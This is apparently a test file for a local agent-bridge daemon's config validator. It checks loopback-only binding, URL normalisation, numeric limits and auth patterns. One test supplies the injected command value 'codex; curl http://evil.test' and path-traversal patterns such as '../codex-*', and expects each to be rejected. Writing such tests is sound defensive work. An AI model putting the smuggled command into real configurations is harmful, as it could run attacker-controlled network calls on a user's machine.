import { describe, expect, test } from "bun:test";
import {
  isLoopbackBindHost,
  loadBridgeConfigFromText,
  normalizeLoopbackHttpBaseUrl,
  resolveBindHost,
} from "../src/config.ts";

describe("security config validation", () => {
  test("refuses non-loopback bind hosts unless explicitly allowed", () => {
    expect(resolveBindHost({})).toBe("127.0.0.1");
    expect(resolveBindHost({ INBAND_BIND: "localhost" })).toBe("localhost");
    expect(resolveBindHost({ INBAND_BIND: "::1" })).toBe("::1");
    expect(isLoopbackBindHost("127.0.0.1")).toBe(true);
    expect(isLoopbackBindHost("0.0.0.0")).toBe(false);

    expect(() => resolveBindHost({ INBAND_BIND: "0.0.0.0" })).toThrow(/non-loopback/i);
    expect(() => resolveBindHost({ INBAND_BIND: "192.168.1.10" })).toThrow(/non-loopback/i);

    expect(
      resolveBindHost({
        INBAND_BIND: "0.0.0.0",
        INBAND_UNSAFE_REMOTE_BIND: "1",
      }),
    ).toBe("0.0.0.0");
  });

  test("normalizes only loopback HTTP base URLs by default", () => {
    expect(normalizeLoopbackHttpBaseUrl(" http://127.0.0.1:14096/ ")).toBe("http://127.0.0.1:14096");
    expect(normalizeLoopbackHttpBaseUrl("http://localhost:14096")).toBe("http://localhost:14096");
    expect(normalizeLoopbackHttpBaseUrl("http://[::1]:14096")).toBe("http://[::1]:14096");

    expect(() => normalizeLoopbackHttpBaseUrl("http://bridge.example.test")).toThrow(/non-loopback/i);
    expect(() => normalizeLoopbackHttpBaseUrl("file:///tmp/socket")).toThrow(/http/i);
  });

  test("validates bridge config before the daemon starts", () => {
    const config = loadBridgeConfigFromText(`{
      "port": 7447,
      "maxMessageBytes": 65536,
      "wake": {
        "opencode": {
          "type": "opencode",
          "baseUrl": "http://127.0.0.1:14096/",
          "prompt": "wake",
          "debounceSeconds": 30,
          "maxWakesPerHour": 20
        },
        "codex": {
          "type": "codex",
          "command": "codex",
          "prompt": "mail for {mailbox}",
          "debounceSeconds": 30,
          "maxWakesPerHour": 20,
          "retryDelaysSeconds": [5, 15, 30, 60]
        }
      }
    }`);

    expect(config.wake.opencode).toMatchObject({ baseUrl: "http://127.0.0.1:14096" });
    expect(() => loadBridgeConfigFromText(`{"port": 70000, "maxMessageBytes": 10, "wake": {}}`)).toThrow(/port/i);
    expect(() =>
      loadBridgeConfigFromText(`{
        "port": 7447,
        "maxMessageBytes": 0,
        "wake": {}
      }`),
    ).toThrow(/maxMessageBytes/i);
    expect(() =>
      loadBridgeConfigFromText(`{
        "port": 7447,
        "maxMessageBytes": 65536,
        "wake": {
          "opencode": {
            "type": "opencode",
            "baseUrl": "http://example.test:14096",
            "prompt": "wake",
            "debounceSeconds": 30,
            "maxWakesPerHour": 20
          }
        }
      }`),
    ).toThrow(/non-loopback/i);
    expect(() =>
      loadBridgeConfigFromText(`{
        "port": 7447,
        "maxMessageBytes": 65536,
        "wake": {
          "codex": {
            "type": "codex",
            "command": "codex; curl http://evil.test",
            "prompt": "mail for {mailbox}",
            "debounceSeconds": 30,
            "maxWakesPerHour": 20,
            "retryDelaysSeconds": [5]
          }
        }
      }`),
    ).toThrow(/shell command/i);
    expect(() =>
      loadBridgeConfigFromText(`{
        "port": 7447,
        "maxMessageBytes": 65536,
        "auth": {
          "clients": {
            "claude": {
              "token": "${"c".repeat(64)}",
              "agents": ["../codex-*"]
            }
          }
        },
        "wake": {}
      }`),
    ).toThrow(/agent pattern/i);
    expect(() =>
      loadBridgeConfigFromText(`{
        "port": 7447,
        "maxMessageBytes": 65536,
        "auth": {
          "clients": {
            "codex": {
              "token": "${"d".repeat(64)}",
              "agents": ["codex-*"],
              "directory": ["../claude-*"]
            }
          }
        },
        "wake": {}
      }`),
    ).toThrow(/directory/i);
  });
});
